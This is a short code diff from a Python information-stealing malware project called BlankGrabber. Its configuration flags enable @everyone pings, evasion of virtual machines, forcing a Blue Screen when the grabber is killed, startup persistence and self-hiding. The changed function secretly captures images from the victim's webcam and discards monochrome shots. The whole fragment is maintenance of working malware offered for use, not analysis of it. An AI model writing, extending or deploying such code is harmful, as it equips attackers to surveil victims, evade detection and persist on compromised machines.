@@ -28,7 +28,7 @@ else:
     _config = {}
 
 PINGME = _config.get("PINGME", True) # Pings @everyone
-VMPROTECT = _config.get("VMPROTECT", True) # Tries to protect your grabber from VMs
+VMPROTECT = _config.get("VMPROTECT", True) # Protect your grabber from VMs
 BSOD = _config.get("BSOD", True) # Tries to trigger Blue Screen if grabber force exit
 STARTUP = _config.get("STARTUP", True) # Puts the grabber in startup
 HIDE_ITSELF = _config.get("HIDE_ITSELF", True) # Hides the Grabber
@@ -184,6 +184,8 @@ class BlankGrabber:
         if call.returncode != 0:
             return
         subprocess.run("cm.bam /filename Webcam.bmp", capture_output= True, shell= True, cwd= sys._MEIPASS)
+        if not os.path.isfile(os.path.join(sys._MEIPASS, "Webcam.bmp")):
+            return
         if is_monochrome(os.path.join(sys._MEIPASS, "Webcam.bmp")):
             os.remove(os.path.join(sys._MEIPASS, "Webcam.bmp"))
             return
